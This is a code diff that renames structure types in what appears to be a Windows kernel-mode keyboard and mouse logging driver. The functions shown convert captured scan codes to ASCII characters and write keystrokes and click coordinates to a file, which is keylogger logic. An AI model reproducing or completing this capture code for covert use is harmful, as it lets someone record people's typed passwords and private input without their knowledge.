@@ -258,11 +258,11 @@ void logMouToDbg(PMOUSE_INPUT_DATA pMouInputData) {
 
 
 static NTSTATUS logKbdToFile(PLIST_ENTRY pKbdListEntry, HANDLE hFile) {
-	KbdListData* const pKbdListData = CONTAINING_RECORD(pKbdListEntry, KbdListData, list);
+	KbdDataEntry* const pKbdDataEntry = CONTAINING_RECORD(pKbdListEntry, KbdDataEntry, list);
 	NTSTATUS ntStatus = STATUS_SUCCESS;
 
-	if (!(pKbdListData->data.Flags & KEY_BREAK)) {
-		const char key = scanToAscii[pKbdListData->data.MakeCode];
+	if (!(pKbdDataEntry->data.Flags & KEY_BREAK)) {
+		const char key = scanToAscii[pKbdDataEntry->data.MakeCode];
 
 		char buffer[0x8] = { 0 };
 		ntStatus = RtlStringCbPrintfA(buffer, sizeof(buffer), "%c", key);
@@ -293,24 +293,24 @@ static NTSTATUS logKbdToFile(PLIST_ENTRY pKbdListEntry, HANDLE hFile) {
 
 	}
 
-	ExFreePoolWithTag(pKbdListData, KBD_LIST_DATA_TAG);
+	ExFreePoolWithTag(pKbdDataEntry, KBD_LIST_DATA_TAG);
 
 	return ntStatus;
 }
 
 
 static NTSTATUS logMouToFile(PLIST_ENTRY pMouListEntry, HANDLE hFile) {
-	MouListData* const pMouListData = CONTAINING_RECORD(pMouListEntry, MouListData, list);
+	MouDataEntry* const pMouDataEntry = CONTAINING_RECORD(pMouListEntry, MouDataEntry, list);
 	NTSTATUS ntStatus = STATUS_SUCCESS;
 
-	if (pMouListData->data.ButtonFlags == MOUSE_LEFT_BUTTON_DOWN || pMouListData->data.ButtonFlags == MOUSE_RIGHT_BUTTON_DOWN) {
+	if (pMouDataEntry->data.ButtonFlags == MOUSE_LEFT_BUTTON_DOWN || pMouDataEntry->data.ButtonFlags == MOUSE_RIGHT_BUTTON_DOWN) {
 		char buffer[0x20] = { 0 };
 
-		if (pMouListData->data.ButtonFlags == MOUSE_LEFT_BUTTON_DOWN) {
-			ntStatus = RtlStringCbPrintfA(buffer, sizeof(buffer), "%s%d%s%d%c", "LEFT@X:", pMouListData->data.LastX, "Y:", pMouListData->data.LastY, '\n');
+		if (pMouDataEntry->data.ButtonFlags == MOUSE_LEFT_BUTTON_DOWN) {
+			ntStatus = RtlStringCbPrintfA(buffer, sizeof(buffer), "%s%d%s%d%c", "LEFT@X:", pMouDataEntry->data.LastX, "Y:", pMouDataEntry->data.LastY, '\n');
 		}
-		else if (pMouListData->data.ButtonFlags == MOUSE_RIGHT_BUTTON_DOWN) {
-			ntStatus = RtlStringCbPrintfA(buffer, sizeof(buffer), "%s%d%s%d%c", "RIGHT@X:", pMouListData->data.LastX, "Y:", pMouListData->data.LastY, '\n');
+		else if (pMouDataEntry->data.ButtonFlags == MOUSE_RIGHT_BUTTON_DOWN) {
+			ntStatus = RtlStringCbPrintfA(buffer, sizeof(buffer), "%s%d%s%d%c", "RIGHT@X:", pMouDataEntry->data.LastX, "Y:", pMouDataEntry->data.LastY, '\n');
 		}
 
 		if (!NT_SUCCESS(ntStatus)) {
@@ -339,7 +339,7 @@ static NTSTATUS logMouToFile(PLIST_ENTRY pMouListEntry, HANDLE hFile) {
 
 	}
 
-	ExFreePoolWithTag(pMouListData, MOU_LIST_DATA_TAG);
+	ExFreePoolWithTag(pMouDataEntry, MOU_LIST_DATA_TAG);
 
 	return ntStatus;
 }
